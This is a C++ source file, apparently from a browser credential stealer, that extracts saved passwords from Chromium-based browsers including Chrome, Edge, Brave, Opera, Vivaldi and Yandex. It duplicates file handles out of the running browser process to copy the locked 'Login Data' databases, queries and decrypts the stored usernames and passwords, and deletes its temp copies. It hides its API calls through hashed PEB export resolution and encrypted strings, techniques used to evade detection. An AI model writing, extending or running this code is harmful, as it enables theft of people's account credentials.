#include "password_extractor.h"
#include "credential_decryptor.h"
#include "logger.h"
#include "str_encrypt.h"
#include "peb_resolve.h"
#include "syscalls/syscall_resolver.h"
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <algorithm>
#include <sstream>
#include <iostream>
#include <set>
#include <cctype>

using namespace ChromeExtractor::Syscalls;

// ── Handle-duplication helpers ────────────────────────────────────────────────
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define SystemHandleInformation 16

typedef struct _SYS_HANDLE_ENTRY_PW {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYS_HANDLE_ENTRY_PW;

typedef struct _SYS_HANDLE_INFO_PW {
    ULONG NumberOfHandles;
    SYS_HANDLE_ENTRY_PW Handles[1];
} SYS_HANDLE_INFO_PW;

typedef NTSTATUS(NTAPI* pfnNtQSI_PW)(ULONG, PVOID, ULONG, PULONG);

struct PathQueryPW { HANDLE h; wchar_t path[MAX_PATH]; };

static DWORD WINAPI PathQueryThreadPW(LPVOID p) {
    auto* q = (PathQueryPW*)p;
    GetFinalPathNameByHandleW(q->h, q->path, MAX_PATH, VOLUME_NAME_NT);
    return 0;
}

static bool GetPathTimeoutPW(HANDLE h, wchar_t* out, int max) {
    using FnCT  = HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    using FnWFS = DWORD(WINAPI*)(HANDLE, DWORD);
    using FnTT  = BOOL(WINAPI*)(HANDLE, DWORD);
    using FnCH  = BOOL(WINAPI*)(HANDLE);
    constexpr DWORD kKB  = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
    constexpr DWORD kCT  = ChromeExtractor::Syscalls::PebHash("CreateThread");
    constexpr DWORD kWFS = ChromeExtractor::Syscalls::PebHash("WaitForSingleObject");
    constexpr DWORD kTT  = ChromeExtractor::Syscalls::PebHash("TerminateThread");
    constexpr DWORD kCH  = ChromeExtractor::Syscalls::PebHash("CloseHandle");
    void* hm = ChromeExtractor::Syscalls::PebGetModule(kKB);
    if (!hm) return false;
    auto pCT  = reinterpret_cast<FnCT> (ChromeExtractor::Syscalls::PebGetExport(hm, kCT));
    auto pWFS = reinterpret_cast<FnWFS>(ChromeExtractor::Syscalls::PebGetExport(hm, kWFS));
    auto pTT  = reinterpret_cast<FnTT> (ChromeExtractor::Syscalls::PebGetExport(hm, kTT));
    auto pCH  = reinterpret_cast<FnCH> (ChromeExtractor::Syscalls::PebGetExport(hm, kCH));
    if (!pCT || !pWFS) return false;

    PathQueryPW q = { h, {} };
    HANDLE t = pCT(nullptr, 0, PathQueryThreadPW, &q, 0, nullptr);
    if (!t) return false;
    bool ok = (pWFS(t, 500) == WAIT_OBJECT_0);
    if (!ok && pTT) pTT(t, 0);
    if (pCH) pCH(t);
    if (ok && q.path[0]) { wcsncpy_s(out, max, q.path, _TRUNCATE); return true; }
    return false;
}

static std::vector<DWORD> GetPIDsByNamePW(const char* exe) {
    std::vector<DWORD> pids;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return pids;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exe) == 0) pids.push_back(pe.th32ProcessID);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pids;
}

static HANDLE StealFileHandlePW(const std::string& target_path, const char* browser_exe) {
    static auto NtQSI = PebResolve<pfnNtQSI_PW>(H_NTDLL, H_NtQSI);
    if (!NtQSI || !browser_exe) return INVALID_HANDLE_VALUE;

    using FnOP  = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
    using FnDH  = BOOL(WINAPI*)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
    using FnGCP = DWORD(WINAPI*)();
    using FnGCPID = DWORD(WINAPI*)();
    using FnCH  = BOOL(WINAPI*)(HANDLE);
    using FnCFW = HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    using FnSFP = DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD);
    constexpr DWORD kKB    = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
    constexpr DWORD kOP    = ChromeExtractor::Syscalls::PebHash("OpenProcess");
    constexpr DWORD kDH    = ChromeExtractor::Syscalls::PebHash("DuplicateHandle");
    constexpr DWORD kGCP   = ChromeExtractor::Syscalls::PebHash("GetCurrentProcess");
    constexpr DWORD kGCPID = ChromeExtractor::Syscalls::PebHash("GetCurrentProcessId");
    constexpr DWORD kCH    = ChromeExtractor::Syscalls::PebHash("CloseHandle");
    constexpr DWORD kCFW   = ChromeExtractor::Syscalls::PebHash("CreateFileW");
    constexpr DWORD kSFP   = ChromeExtractor::Syscalls::PebHash("SetFilePointer");
    void* hkb = ChromeExtractor::Syscalls::PebGetModule(kKB);
    if (!hkb) return INVALID_HANDLE_VALUE;
    auto pOP    = reinterpret_cast<FnOP>   (ChromeExtractor::Syscalls::PebGetExport(hkb, kOP));
    auto pDH    = reinterpret_cast<FnDH>   (ChromeExtractor::Syscalls::PebGetExport(hkb, kDH));
    auto pGCP   = reinterpret_cast<FnGCP>  (ChromeExtractor::Syscalls::PebGetExport(hkb, kGCP));
    auto pGCPID = reinterpret_cast<FnGCPID>(ChromeExtractor::Syscalls::PebGetExport(hkb, kGCPID));
    auto pCH    = reinterpret_cast<FnCH>   (ChromeExtractor::Syscalls::PebGetExport(hkb, kCH));
    auto pCFW   = reinterpret_cast<FnCFW>  (ChromeExtractor::Syscalls::PebGetExport(hkb, kCFW));
    auto pSFP   = reinterpret_cast<FnSFP>  (ChromeExtractor::Syscalls::PebGetExport(hkb, kSFP));
    if (!pOP || !pDH || !pGCP || !pCH) return INVALID_HANDLE_VALUE;

    wchar_t canon[MAX_PATH] = {};
    {
        wchar_t wide[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, target_path.c_str(), -1, wide, MAX_PATH);
        if (pCFW) {
            HANDLE hTmp = pCFW(wide, 0,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hTmp != INVALID_HANDLE_VALUE) {
                GetFinalPathNameByHandleW(hTmp, canon, MAX_PATH, VOLUME_NAME_NT);
                pCH(hTmp);
            }
        }
        if (!canon[0]) return INVALID_HANDLE_VALUE;
    }

    auto pids = GetPIDsByNamePW(browser_exe);
    if (pids.empty()) return INVALID_HANDLE_VALUE;
    std::sort(pids.begin(), pids.end());

    std::vector<BYTE> buf(1 << 20);
    ULONG needed = 0;
    NTSTATUS st;
    for (;;) {
        st = NtQSI(SystemHandleInformation, buf.data(), (ULONG)buf.size(), &needed);
        if (st != STATUS_INFO_LENGTH_MISMATCH) break;
        buf.resize(buf.size() * 2);
    }
    if (st != 0) return INVALID_HANDLE_VALUE;

    auto* info = (SYS_HANDLE_INFO_PW*)buf.data();
    DWORD my_pid = pGCPID ? pGCPID() : 0;
    HANDLE hProc = INVALID_HANDLE_VALUE;
    DWORD  cur_pid = 0;
    HANDLE result = INVALID_HANDLE_VALUE;
    HANDLE hSelf = pGCP();

    for (ULONG i = 0; i < info->NumberOfHandles && result == INVALID_HANDLE_VALUE; i++) {
        auto& e = info->Handles[i];
        DWORD pid = e.UniqueProcessId;
        if (pid == my_pid) continue;
        if (!std::binary_search(pids.begin(), pids.end(), pid)) continue;
        if (pid != cur_pid) {
            if (hProc != INVALID_HANDLE_VALUE) pCH(hProc);
            hProc = pOP(PROCESS_DUP_HANDLE, FALSE, pid);
            cur_pid = pid;
        }
        if (!hProc || hProc == INVALID_HANDLE_VALUE) continue;

        HANDLE dup = NULL;
        if (!pDH(hProc, (HANDLE)(ULONG_PTR)e.HandleValue,
            hSelf, &dup, GENERIC_READ, FALSE, 0)) continue;

        wchar_t path[MAX_PATH] = {};
        bool matched = GetPathTimeoutPW(dup, path, MAX_PATH) && (_wcsicmp(path, canon) == 0);
        if (matched) {
            if (pSFP) pSFP(dup, 0, nullptr, FILE_BEGIN);
            result = dup;
        }
        else {
            pCH(dup);
        }
    }
    if (hProc != INVALID_HANDLE_VALUE) pCH(hProc);
    return result;
}

static bool CopyLockedFilePW(const std::string& src, const std::string& dst,
    const char* browser_exe = nullptr) {
    using FnCFA = HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    using FnRF  = BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    using FnWF  = BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    using FnCH  = BOOL(WINAPI*)(HANDLE);
    using FnDFA = BOOL(WINAPI*)(LPCSTR);
    using FnGLE = DWORD(WINAPI*)();
    constexpr DWORD kKB  = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
    constexpr DWORD kCFA = ChromeExtractor::Syscalls::PebHash("CreateFileA");
    constexpr DWORD kRF  = ChromeExtractor::Syscalls::PebHash("ReadFile");
    constexpr DWORD kWF  = ChromeExtractor::Syscalls::PebHash("WriteFile");
    constexpr DWORD kCH  = ChromeExtractor::Syscalls::PebHash("CloseHandle");
    constexpr DWORD kDFA = ChromeExtractor::Syscalls::PebHash("DeleteFileA");
    constexpr DWORD kGLE = ChromeExtractor::Syscalls::PebHash("GetLastError");
    void* hkb = ChromeExtractor::Syscalls::PebGetModule(kKB);
    if (!hkb) return false;
    auto pCFA = reinterpret_cast<FnCFA>(ChromeExtractor::Syscalls::PebGetExport(hkb, kCFA));
    auto pRF  = reinterpret_cast<FnRF> (ChromeExtractor::Syscalls::PebGetExport(hkb, kRF));
    auto pWF  = reinterpret_cast<FnWF> (ChromeExtractor::Syscalls::PebGetExport(hkb, kWF));
    auto pCH  = reinterpret_cast<FnCH> (ChromeExtractor::Syscalls::PebGetExport(hkb, kCH));
    auto pDFA = reinterpret_cast<FnDFA>(ChromeExtractor::Syscalls::PebGetExport(hkb, kDFA));
    auto pGLE = reinterpret_cast<FnGLE>(ChromeExtractor::Syscalls::PebGetExport(hkb, kGLE));
    if (!pCFA || !pRF || !pWF || !pCH) return false;

    HANDLE hSrc = pCFA(src.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hSrc == INVALID_HANDLE_VALUE && pGLE && pGLE() == ERROR_SHARING_VIOLATION) {
        g_logger.Debug("Sharing violation on " + src + ", attempting handle steal");
        hSrc = StealFileHandlePW(src, browser_exe);
    }
    if (hSrc == INVALID_HANDLE_VALUE) {
        g_logger.Debug("Cannot open source: " + src);
        return false;
    }

    HANDLE hDst = pCFA(dst.c_str(), GENERIC_WRITE, 0,
        nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hDst == INVALID_HANDLE_VALUE) {
        g_logger.Debug("Cannot create temp: " + dst);
        pCH(hSrc);
        return false;
    }

    char buf[65536]; DWORD rd, wr; bool ok = true;
    while (ok && pRF(hSrc, buf, sizeof(buf), &rd, nullptr) && rd > 0)
        ok = pWF(hDst, buf, rd, &wr, nullptr) && (wr == rd);
    pCH(hSrc); pCH(hDst);
    if (!ok && pDFA) pDFA(dst.c_str());
    return ok;
}

// ── PasswordExtractor ──────────────────────────────────────────────────────────
PasswordExtractor::PasswordExtractor(const std::string& profile_path)
    : profile_path(profile_path) {
}

static bool OpenLoginDB(SQLiteDB& db, const std::string& db_path,
    const std::string& tmp_path, const char* browser_exe) {
    WIN32_FIND_DATAA fd;
    HANDLE fh = FindFirstFileA(db_path.c_str(), &fd);
    if (fh == INVALID_HANDLE_VALUE) return false;
    FindClose(fh);

    if (!CopyLockedFilePW(db_path, tmp_path, browser_exe)) {
        g_logger.Debug("Copy failed, trying direct open: " + db_path);
        if (db.Open(db_path)) {
            g_logger.Info("Opened " + db_path + " directly (locked)");
            return true;
        }
        g_logger.Warning("Cannot open: " + db_path);
        return false;
    }
    if (db.Open(tmp_path)) {
        g_logger.Info("Opened " + db_path + " from temp copy");
        return true;
    }
    DeleteFileA(tmp_path.c_str());
    if (db.Open(db_path)) {
        g_logger.Info("Opened " + db_path + " directly (fallback)");
        return true;
    }
    g_logger.Warning("Cannot open: " + db_path);
    return false;
}

static const char* BrowserExeFromPath(const std::string& path) {
    std::string lower = path;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    if (lower.find("\\google\\") != std::string::npos ||
        lower.find("\\chrome\\") != std::string::npos) return "chrome.exe";
    if (lower.find("\\edge\\") != std::string::npos) return "msedge.exe";
    if (lower.find("bravesoftware") != std::string::npos) return "brave.exe";
    if (lower.find("opera gx") != std::string::npos) return "opera.exe";
    if (lower.find("opera software") != std::string::npos) return "opera.exe";
    if (lower.find("\\vivaldi\\") != std::string::npos) return "vivaldi.exe";
    if (lower.find("\\yandex\\") != std::string::npos) return "browser.exe";
    return nullptr;
}

bool PasswordExtractor::OpenDatabase() {
    std::string db_path = profile_path + XSTR("\\Login Data");
    char tmpdir[MAX_PATH] = {};
    { using FnGTPA = DWORD(WINAPI*)(DWORD, LPSTR);
      constexpr DWORD kH = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
      constexpr DWORD kF = ChromeExtractor::Syscalls::PebHash("GetTempPathA");
      void* hm = ChromeExtractor::Syscalls::PebGetModule(kH);
      if (hm) { auto f = reinterpret_cast<FnGTPA>(ChromeExtractor::Syscalls::PebGetExport(hm, kF));
                if (f) f(MAX_PATH, tmpdir); } }
    std::string tmp = std::string(tmpdir) + "cex_login_" + std::to_string(GetCurrentProcessId()) + ".db";
    return OpenLoginDB(password_db, db_path, tmp, BrowserExeFromPath(profile_path));
}

struct PasswordDedupKey {
    std::string origin;
    std::string username;
    std::string password;
    bool operator<(const PasswordDedupKey& o) const {
        if (origin != o.origin) return origin < o.origin;
        if (username != o.username) return username < o.username;
        return password < o.password;
    }
};

static std::vector<PasswordEntry> QueryLogins(SQLiteDB& db,
    CredentialDecryptor* decryptor,
    const std::string& source_label,
    std::set<PasswordDedupKey>& seen) {
    std::vector<PasswordEntry> results;
    auto rows = db.QueryWithBlob(
        XSTR("SELECT origin_url, username_value, password_value FROM logins"));
    for (const auto& row : rows) {
        if (row.size() < 3) continue;
        std::string origin = row[0];
        std::string username = row[1];
        const std::string& blob = row[2];
        if (blob.empty()) continue;
        if (origin.empty() && username.empty()) continue;

        std::string password;
        if (decryptor && decryptor->IsInitialized()) {
            std::vector<uint8_t> enc(blob.begin(), blob.end());
            password = decryptor->DecryptRawValue(enc);
            if (password.empty()) continue;
        }
        else {
            password = "(encrypted)";
        }

        PasswordDedupKey key{ origin, username, password };
        if (seen.count(key)) continue;
        seen.insert(key);

        PasswordEntry e;
        e.origin = origin;
        e.username = username;
        e.password = password;
        e.signon_realm = source_label;
        results.push_back(e);
    }
    return results;
}

std::vector<PasswordEntry> PasswordExtractor::ExtractPasswords(CredentialDecryptor* decryptor) {
    std::vector<PasswordEntry> results;
    std::set<PasswordDedupKey> seen;
    const char* browser_exe = BrowserExeFromPath(profile_path);
    char tmpdir[MAX_PATH] = {};
    { using FnGTPA = DWORD(WINAPI*)(DWORD, LPSTR);
      constexpr DWORD kH = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
      constexpr DWORD kF = ChromeExtractor::Syscalls::PebHash("GetTempPathA");
      void* hm = ChromeExtractor::Syscalls::PebGetModule(kH);
      if (hm) { auto f = reinterpret_cast<FnGTPA>(ChromeExtractor::Syscalls::PebGetExport(hm, kF));
                if (f) f(MAX_PATH, tmpdir); } }
    std::string pid_s = std::to_string(GetCurrentProcessId());

    {
        SQLiteDB db;
        std::string path = profile_path + XSTR("\\Login Data");
        std::string tmp = std::string(tmpdir) + "cex_login_" + pid_s + ".db";
        if (OpenLoginDB(db, path, tmp, browser_exe)) {
            auto v = QueryLogins(db, decryptor, "local", seen);
            results.insert(results.end(), v.begin(), v.end());
            db.Close();
            for (int retry = 0; retry < 3; retry++) {
                if (DeleteFileA(tmp.c_str())) break;
                { auto pS = IMP(Sleep); if (pS) pS(50); }
            }
        }
    }

    {
        SQLiteDB db;
        std::string path = profile_path + XSTR("\\Login Data For Account");
        std::string tmp = std::string(tmpdir) + "cex_loginac_" + pid_s + ".db";
        if (OpenLoginDB(db, path, tmp, browser_exe)) {
            auto v = QueryLogins(db, decryptor, "account", seen);
            results.insert(results.end(), v.begin(), v.end());
            db.Close();
            for (int retry = 0; retry < 3; retry++) {
                if (DeleteFileA(tmp.c_str())) break;
                { auto pS = IMP(Sleep); if (pS) pS(50); }
            }
        }
    }

    if (results.empty())
        g_logger.Info("No passwords found");
    else
        g_logger.Info("Extracted " + std::to_string(results.size()) + " unique passwords");
    return results;
}